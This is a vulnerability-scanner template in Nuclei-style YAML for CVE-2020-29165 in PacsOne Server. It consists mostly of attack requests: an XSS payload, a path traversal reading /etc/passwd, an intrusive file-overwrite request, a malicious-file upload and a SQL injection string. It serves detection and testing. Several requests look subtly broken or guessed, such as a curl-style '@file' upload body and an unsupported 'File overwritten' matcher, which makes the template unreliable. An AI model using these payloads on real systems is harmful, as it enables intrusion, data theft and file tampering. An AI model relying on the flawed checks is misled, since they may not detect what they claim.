id: CVE-2020-29165

info:
  name: PacsOne Server Multiple Vulnerabilities
  author: ProjectDiscoveryAI
  severity: critical
  description: PacsOne Server (PACS Server In One Box) below 7.1.1 is affected by multiple vulnerabilities including XSS, arbitrary file operations, and SQL Injection.
  impact: |
    Successful exploitation could result in unauthorized access or sensitive data exposure.
  remediation: |
    Apply the vendor-supplied patches or updates to mitigate the vulnerabilities.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-29165
    cwe-id: CWE-306
    epss-score: 0.00647
    epss-percentile: 0.79943
    cpe: cpe:2.3:a:rainbowfishsoftware:pacsone_server:*:*:*:*:*:*:*:*
  metadata:
    vendor: rainbowfishsoftware
    product: pacsone_server
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/Pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E"

    matchers:
      - type: word
        words:
          - "<img src=\"\" onerror=\"alert(1);\">1</img>"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/Pacs/authenticate.php"

    body: "formUsername=../php/security.php"
    matchers:
      - type: word
        words:
          - "File overwritten"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/MDPACS/PACS/php/encapsulatedDoc.php?file=../../../../etc/passwd"

    matchers:
      - type: word
        words:
          - "root:x"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/MDPACS/PACS/php/importWorklist.php"
      - "{{BaseURL}}/MDPACS/PACS/php/uploadImage.php"

    body: "file=@evil_payload.jpg"
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/Pacs/studyNotes.php?note=' OR '1'='1"

    matchers:
      - type: word
        words:
          - "SQL syntax"
        part: body
